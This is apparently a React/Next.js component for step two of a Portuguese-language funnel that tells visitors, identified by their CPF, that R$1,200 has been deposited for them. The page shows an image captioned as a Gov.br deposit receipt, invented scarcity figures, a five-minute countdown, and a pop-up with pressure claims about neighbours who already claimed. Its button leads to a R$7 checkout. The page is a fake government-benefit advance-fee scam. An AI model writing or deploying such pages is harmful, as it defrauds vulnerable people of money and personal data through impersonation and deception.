
"use client";

import type React from 'react';
import { useState, useEffect, useCallback } from 'react';
import OfferTimer from '@/components/features/OfferTimer';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import Image from 'next/image';
import { Banknote, AlertTriangle } from 'lucide-react';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

interface OfferStepProps {
  cpf: string | null; 
}

const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
  const [showEmergencyModal, setShowEmergencyModal] = useState(false);

  const handleResgatarClick = () => {
    console.log("Resgatar Agora clicado! CPF:", cpf, "Redirecionar para checkout de R$7.");
    // In a real scenario, you would redirect here:
    // window.location.href = 'YOUR_CHECKOUT_URL';
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      if (!sessionStorage.getItem('emergencyModalShown')) {
        setShowEmergencyModal(true);
        sessionStorage.setItem('emergencyModalShown', 'true');
      }
    }, 15000); // 15 seconds

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="w-full max-w-xl text-center p-6 md:p-8 bg-card shadow-2xl rounded-lg border-2 border-accent">
      <h1 className="font-headline text-2xl md:text-3xl font-bold text-primary mb-4">
        🎉 PARABÉNS! VOCÊ TEM DIREITO A R$1.200 EM 24H!
      </h1>

      <div className="my-6 space-y-4">
        <div>
          <p className="text-sm font-semibold text-muted-foreground mb-1">87% DAS VAGAS PREENCHIDAS</p>
          <Progress value={87} className="w-full h-3" indicatorClassName="bg-destructive" />
        </div>

        <div className="p-3 bg-secondary rounded-md">
          <p className="font-bold text-lg text-accent">DEPÓSITO CONFIRMADO: R$1.200</p>
        </div>
        
        <div className="my-4 border border-border rounded-md overflow-hidden shadow-lg">
           <Image 
            src="https://i.imgur.com/J6Ww0BM.png" 
            alt="Comprovante de depósito Gov.br" 
            width={600} 
            height={400} 
            layout="responsive"
            data-ai-hint="bank slip"
          />
        </div>

        <div className="mb-6 p-3 bg-destructive/10 border border-destructive/30 rounded-md">
          <div className="flex items-center justify-center text-destructive font-semibold text-lg">
            <AlertTriangle className="h-6 w-6 mr-2 animate-pulse" />
            ⏳ TEMPO RESTANTE PARA RESGATE: <OfferTimer initialMinutes={4} initialSeconds={59} />
          </div>
        </div>
      </div>
      
      <Button 
        className="w-full h-16 text-lg md:text-xl font-bold bg-accent text-accent-foreground hover:bg-accent/90 animate-pulse"
        onClick={handleResgatarClick}
      >
        <Banknote className="mr-2 h-7 w-7" />
        RESGATAR AGORA (ETAPA 2/2)
      </Button>

      {showEmergencyModal && (
        <AlertDialog open={showEmergencyModal} onOpenChange={setShowEmergencyModal}>
          <AlertDialogContent className="border-destructive border-2">
            <AlertDialogHeader>
              <AlertDialogTitle className="font-headline text-2xl text-destructive">⚠️ ATENÇÃO! VAI PERDER ESSA CHANCE? ⚠️</AlertDialogTitle>
              <AlertDialogDescription className="text-lg text-foreground">
                Você vai deixar <strong className="text-accent font-bold">R$1.200,00</strong> para trás? <br />
                <span className="font-semibold">10 pessoas da sua região</span> já resgataram nas últimas horas!
                Não perca essa oportunidade única.
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter className="gap-2 sm:gap-0">
              <AlertDialogCancel asChild>
                <Button variant="outline" onClick={() => setShowEmergencyModal(false)} className="text-lg p-6">
                  CONTINUAR E PERDER
                </Button>
              </AlertDialogCancel>
              <AlertDialogAction asChild>
                 <Button variant="destructive" onClick={handleResgatarClick} className="text-lg p-6 animate-pulse">
                  QUERO RESGATAR AGORA!
                </Button>
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
      )}
    </div>
  );
};

export default OfferStep;
